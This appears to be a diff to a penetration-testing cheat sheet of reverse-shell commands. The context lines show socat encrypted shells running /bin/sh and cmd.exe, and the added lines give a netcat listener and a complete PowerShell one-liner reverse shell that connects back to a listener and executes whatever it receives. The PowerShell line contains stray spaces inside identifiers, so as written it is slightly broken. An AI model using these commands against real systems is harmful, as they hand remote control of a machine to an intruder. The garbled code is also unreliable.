@@ -72,5 +72,11 @@ Remote machine
 $ socat OPENSSL:local_machine:ip:4443,verify=0 EXEC=/bin/sh
 C:\Users\far2ed> $ socat OPENSSL:local_machine:ip:4443,verify=0 EXEC:'cmd.exe',pipes
 
+-------------------------------------------------------------------
+** Powershell reverse shell
 
+Local machine
+nc -nlvp 443
 
+Remote machine
+C:\Users\offsec> powershell -c "$client = New-Object System.Net.Sockets.TCPClient('local_machine_ip',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.T ext.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII ).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$c lient.Close()"
